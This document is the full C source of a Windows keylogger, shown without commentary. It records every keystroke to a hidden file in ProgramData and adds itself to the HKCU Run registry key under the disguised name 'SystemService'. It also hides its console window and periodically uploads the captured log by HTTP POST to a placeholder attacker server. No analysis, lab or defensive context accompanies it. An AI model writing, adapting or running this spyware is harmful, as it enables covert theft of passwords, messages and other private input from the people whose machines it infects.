#include <windows.h>
#include <stdio.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

// Path where the log file is saved
#define LOG_FILE_PATH "C:\\ProgramData\\system_logs.txt"

// Function for storing key strokes
void logKey(int key, int shiftPressed, FILE *logFile) {
    if (key >= 'A' && key <= 'Z') {
        if (!shiftPressed) {
            key += 32; // Lowercase letters without shift
        }
        fputc(key, logFile);
    } else if (key >= '0' && key <= '9') {
        if (shiftPressed) {
            // Special characters while holding down the Shift key
            const char *shiftKeys = ")!@#$%^&*(";
            fputc(shiftKeys[key - '0'], logFile);
        } else {
            fputc(key, logFile);
        }
    } else {
        // Other keys like spacebar, enter, etc.
        switch (key) {
            case VK_SPACE: fputc(' ', logFile); break;
            case VK_RETURN: fputs("\n", logFile); break;
            case VK_TAB: fputs("[TAB]", logFile); break;
            case VK_BACK: fputs("[BACKSPACE]", logFile); break;
            case VK_SHIFT: fputs("[SHIFT]", logFile); break;
            case VK_CONTROL: fputs("[CTRL]", logFile); break;
            case VK_ESCAPE: fputs("[ESC]", logFile); break;
            case VK_LEFT: fputs("[LEFT ARROW]", logFile); break;
            case VK_UP: fputs("[UP ARROW]", logFile); break;
            case VK_RIGHT: fputs("[RIGHT ARROW]", logFile); break;
            case VK_DOWN: fputs("[DOWN ARROW]", logFile); break;
            case VK_DELETE: fputs("[DELETE]", logFile); break;
            default: fputc(key, logFile); break;
        }
    }
    fflush(logFile);
}

// Function to upload logs via HTTP
void uploadLogs() {
    HINTERNET hInternet = InternetOpen("HTTP_KEYLOGGER", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConnect = InternetConnect(hInternet, "HERE YOUR SERVER", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

    if (hConnect) {
        HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/logupload", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
        if (hRequest) {
            FILE *logFile = fopen(LOG_FILE_PATH, "rb");
            if (logFile) {
                fseek(logFile, 0, SEEK_END);
                long fileSize = ftell(logFile);
                fseek(logFile, 0, SEEK_SET);

                char *data = (char *)malloc(fileSize);
                fread(data, 1, fileSize, logFile);
                fclose(logFile);

                HttpSendRequest(hRequest, NULL, 0, data, fileSize);
                free(data);
            }
            InternetCloseHandle(hRequest);
        }
        InternetCloseHandle(hConnect);
    }
    InternetCloseHandle(hInternet);
}

// Function for entering into the autostart (via registry)
void addToStartup() {
    HKEY hKey;
    const char *path = "\"C:\\ProgramData\\system_service.exe\"";
    if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, "SystemService", 0, REG_SZ, (BYTE *)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }
}

int main() {
    // Open log file
    FILE *logFile;
    logFile = fopen(LOG_FILE_PATH, "a+");
    if (logFile == NULL) return 1;

    addToStartup();  // Enter in autostart

    // Hide console window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    int shiftPressed = 0;
    DWORD uploadCounter = 0;

    // Keylogger loop
    while (1) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(VK_SHIFT)) {
                shiftPressed = 1;
            } else {
                shiftPressed = 0;
            }

            if (GetAsyncKeyState(key) == -32767) {
                logKey(key, shiftPressed, logFile);
            }
        }
        Sleep(10);

        // Upload logs at regular intervals
        uploadCounter++;
        if (uploadCounter >= 50000) {  // Example interval
            uploadLogs();
            uploadCounter = 0;
        }
    }

    fclose(logFile);
    return 0;
}
